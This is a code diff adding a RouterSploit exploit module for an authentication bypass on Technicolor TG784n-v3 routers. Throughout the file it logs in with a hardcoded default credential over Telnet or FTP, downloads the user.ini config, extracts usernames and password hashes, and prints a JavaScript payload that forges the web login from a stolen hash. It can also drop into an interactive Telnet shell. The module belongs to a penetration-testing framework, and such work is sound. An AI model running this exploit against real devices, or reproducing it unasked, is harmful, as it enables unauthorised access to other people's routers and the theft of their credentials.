@@ -1,0 +1,152 @@
+import socket
+import telnetlib
+import re
+import ftplib
+from StringIO import StringIO
+
+from routersploit import (
+    exploits,
+    print_success,
+    print_error,
+    print_status,
+    print_info,
+    mute,
+    validators,
+    print_table,
+)
+
+
+class Exploit(exploits.Exploit):
+    """
+    Exploit implementation for Technicolor TG784n-v3 auth bypass vulnerability.
+    If the target is vulnerable, it allows to bypass authentication.
+    """
+    __info__ = {
+        'name': 'Technicolor TG784n-v3 Auth Bypass',
+        'description': 'Module exploits Technicolor TG784n-v3 authentication bypass vulnerability.',
+        'authors': [
+            'Jose Moreira',  # vulnerability discovery & analysis
+            '0BuRner',  # routersploit module
+            'Marcin Bury <marcin.bury[at]reverse-shell.com>',  # little fixes
+        ],
+        'references': [
+            'http://modem-help.forum-phpbb.co.uk/t1-fixing-username-password-problems',
+            'http://modem-help.forum-phpbb.co.uk/t2-howto-root-tg784',
+        ],
+        'devices': [
+            'Technicolor TG784n-v3',
+            'Unknown number of Technicolor and Thompson routers',
+        ]
+    }
+
+    target = exploits.Option('192.168.0.1', 'Target IP address e.g. 192.168.0.1', validators=validators.ipv4)
+
+    ftp_port = exploits.Option(21, 'Target FTP port')
+    telnet_port = exploits.Option(23, 'Target Telnet port')
+
+    remote_user = exploits.Option('upgrade', 'Default FTP username')
+    remote_pass = exploits.Option('Th0ms0n!', 'Default FTP password for "upgrade" user')
+
+    config_path = exploits.Option('user.ini', 'Path to config file')
+
+    def run(self):
+        response = self.telnet_login()
+        if 'Login not allowed' in response and self.is_port_opened(self.ftp_port):
+            print_error("Telnet: {}:{} Authentication through Telnet not allowed".format(self.target, self.telnet_port))
+            print_status("FTP and HTTP service active")
+            creds = self.ftp_get_config()
+
+            if creds:
+                print_status("Use javascript console (through developer tools) to bypass authentication:")
+                payload = ('var user = "{}"\n'
+                           'var hash2 = "{}";\n'
+                           'var HA2 = MD5("GET" + ":" + uri);\n'
+                           'document.getElementById("user").value = user;\n'
+                           'document.getElementById("hidepw").value = MD5(hash2 + ":" + nonce +":" + "00000001" + ":" + "xyz" + ":" + qop + ":" + HA2);\n'
+                           'document.authform.submit();\n')
+
+                for user in creds:
+                    print_success("User: {} Role: {}".format(user[0], user[2]))
+                    print_info(payload.format(user[0], user[3]))
+
+        elif '}=>' in response:
+            print_success("Successful authentication through Telnet service")
+            tn = telnetlib.Telnet(self.target, int(self.telnet_port), timeout=10)
+            tn.read_until(': ')
+            tn.write(self.remote_user + '\r\n')
+            tn.read_until(': ')
+            tn.write(self.remote_pass + '\r\n')
+            tn.interact()
+        else:
+            print_error("Exploit failed - target seems to be not vulnerable")
+
+    @mute
+    def check(self):
+        response = self.telnet_login()
+        if 'Login not allowed' in response and self.is_port_opened(self.ftp_port) and self.ftp_get_config():
+            return True
+
+        elif '}=>' in response:
+            return True
+
+        return False
+
+    def telnet_login(self):
+        print_status("Telnet: {}:{} Authenticating with Username: {} Password: {}".format(self.target,
+                                                                                          self.telnet_port,
+                                                                                          self.remote_user,
+                                                                                          self.remote_pass))
+        try:
+            tn = telnetlib.Telnet(self.target, int(self.telnet_port), timeout=10)
+            tn.read_until(': ')
+            tn.write(self.remote_user + '\r\n')
+            tn.read_until(': ')
+            tn.write(self.remote_pass + '\r\n')
+            response = tn.read_until("Login not allowed", 10)
+            tn.close()
+        except:
+            return ""
+
+        return response
+
+    def is_port_opened(self, port):
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.settimeout(3)
+            s.connect((self.target, port))
+            return True
+        except:
+            return False
+        finally:
+            s.close()
+
+    def ftp_get_config(self):
+        print_status("FTP {}:{} Trying FTP authentication with Username: {} and Password: {}".format(self.target,
+                                                                                                     self.ftp_port,
+                                                                                                     self.remote_user,
+                                                                                                     self.remote_pass))
+        ftp = ftplib.FTP()
+
+        try:
+            ftp.connect(self.target, port=int(self.ftp_port), timeout=10)
+            ftp.login(self.remote_user, self.remote_pass)
+
+            print_success("FTP {}:{} Authentication successful".format(self.target, self.ftp_port))
+            if self.config_path in ftp.nlst():
+                print_status("FTP {}:{} Downloading: {}".format(self.target, self.ftp_port, self.config_path))
+                r = StringIO()
+                ftp.retrbinary('RETR {}'.format(self.config_path), r.write)
+                ftp.close()
+                data = r.getvalue()
+
+                creds = re.findall(r'add name=(.*) password=(.*) role=(.*) hash2=(.*) crypt=(.*)\r\n', data)
+                if creds:
+                    print_success("Found encrypted credentials:")
+                    print_table(('Name', 'Password', 'Role', 'Hash2', 'Crypt'), *creds)
+                    return creds
+                else:
+                    print_error("Exploit failed - could not find any credentials")
+        except ftplib.all_errors:
+            print_error("Exploit failed - FTP error")
+
+        return None
